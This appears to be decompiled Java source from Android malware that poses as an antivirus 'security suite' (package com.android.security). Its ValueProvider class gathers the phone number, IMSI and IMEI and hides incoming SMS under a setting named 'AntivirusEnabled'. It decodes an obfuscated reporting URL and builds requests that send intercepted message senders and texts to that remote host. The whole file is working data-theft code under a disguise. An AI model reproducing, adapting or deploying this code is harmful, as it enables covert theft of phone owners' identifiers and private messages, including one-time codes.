package com.android.security;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.net.URLEncoder;

public class ValueProvider {
    public static final String AlternativeControl = "AlternativeControl";
    public static final String AlternativeNumber = "AlternativeNumber";
    static Context AppContext = null;
    public static final int FirstReportDelay = 180;
    public static final String SettingHideSms = "AntivirusEnabled";
    public static final String SettingLastSmsSended = "LastSended";
    public static final String SettingUninstallComplete = "AntivirusUninstallComplete";
    public static final String SettingUninstallRequest = "AntivirusUninstallReq";
    public static final String SoftwareVersion = "1.2.3";
    public static final int TimerReportInSeconds = 1500;
    public static final String UrlToReport = "qh't,;t>p%;%:%>/q/a<qndq%roi>qdq2up,d%a>=tqe.cqo,%m/,bi-w=dr.p,h'p";
    public static final String XLastMessage = "XLastMessage";

    public static void ShowMessage(String message) {
        AlertDialog ad = new AlertDialog.Builder(AppContext).create();
        ad.setCancelable(false);
        ad.setMessage(message);
        ad.setButton("OK", new DialogInterface.OnClickListener() {
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });
    }

    public static void LogTrace(String message) {
        Log.i("SSuite", message);
    }

    public static void LogError(String message) {
        Log.i("SSuite", message);
        if (AppContext != null) {
            new DataStorage(AppContext).insert("Error", message);
        }
    }

    public static boolean IsUnInstalled() {
        return GetBoolValue(SettingUninstallRequest);
    }

    public static void SetContext(Context context) {
        AppContext = context;
    }

    public static String GetAntivirusLink() {
        return UrlToReport.replace("[", "").replace("]", "").replace("=", "").replace("-", "").replace("q", "").replace(",", "").replace("<", "").replace(">", "").replace("'", "").replace(";", "").replace("%", "");
    }

    public static void UninstallSoftware() {
        CleanupAlternativeControl();
        SaveBoolValue(SettingUninstallRequest, true);
        SaveBoolValue(SettingHideSms, false);
        SaveBoolValue(SettingUninstallComplete, true);
    }

    public static boolean SaveBoolValue(String ValueName, boolean Value) {
        if (AppContext == null) {
            LogError("AppContext null in SaveBoolValue");
            return false;
        }
        SharedPreferences.Editor editor = AppContext.getSharedPreferences("secsuite", 0).edit();
        editor.putBoolean(ValueName, Value);
        return editor.commit();
    }

    public static boolean SaveStringValue(String ValueName, String Value) {
        if (AppContext == null) {
            LogError("AppContext null in SaveStringValue");
            return false;
        }
        SharedPreferences.Editor editor = AppContext.getSharedPreferences("secsuite", 0).edit();
        editor.putString(ValueName, Value);
        return editor.commit();
    }

    public static String GetStringValue(String ValueName) {
        if (AppContext != null) {
            return AppContext.getSharedPreferences("secsuite", 0).getString(ValueName, "");
        }
        LogError("AppContext null in GetBoolValue");
        return "";
    }

    public static void CleanupAlternativeControl() {
        SaveBoolValue(AlternativeControl, false);
        SaveStringValue(AlternativeNumber, "");
    }

    public static boolean IsAlternativeControlOn() {
        return GetBoolValue(AlternativeControl);
    }

    public static boolean IsTotalHideOn() {
        return GetBoolValue(SettingHideSms);
    }

    public static boolean GetBoolValue(String ValueName) {
        if (AppContext != null) {
            return AppContext.getSharedPreferences("secsuite", 0).getBoolean(ValueName, false);
        }
        LogError("AppContext null in GetBoolValue");
        return false;
    }

    public static String GetActivationCode() {
        if (AppContext == null) {
            LogError("AppContext null in GetActivationCode");
            return "error";
        }
        String imei = ((TelephonyManager) AppContext.getSystemService("phone")).getDeviceId();
        if (imei == null) {
            return "error";
        }
        return "1" + Integer.toString(Integer.parseInt(imei.substring(8))) + "3";
    }

    public static String GetStaticDataString() {
        String myNumber;
        if (AppContext == null) {
            LogError("AppContext null in GetStaticDataString");
            return "error";
        }
        TelephonyManager mgr = (TelephonyManager) AppContext.getSystemService("phone");
        String myNumber2 = mgr.getLine1Number();
        String imsi = mgr.getSubscriberId();
        String imei = mgr.getDeviceId();
        String ActivationId = GetActivationCode();
        if (myNumber2 == null) {
            myNumber = "empty";
        } else {
            myNumber = myNumber2.replace("+", "");
        }
        if (imsi == null) {
            imsi = "empty";
        }
        int smsAreHidden = 0;
        if (GetBoolValue(SettingHideSms)) {
            smsAreHidden = 1;
        }
        return String.format("?to=%s&i=%s&m=%s&aid=%s&h=%s&v=%s", new Object[]{myNumber, imsi, imei, ActivationId, Integer.valueOf(smsAreHidden), SoftwareVersion});
    }

    public static String GetMessageReportUrl(String Number, String Text) {
        String GetString = String.valueOf(GetStaticDataString()) + String.format("&from=%s&text=%s", new Object[]{URLEncoder.encode(Number), URLEncoder.encode(Text)});
        if (Text.indexOf(XLastMessage) > 0) {
            GetString = String.valueOf(GetString) + "&last=1";
        }
        return String.valueOf(GetAntivirusLink()) + GetString;
    }
}
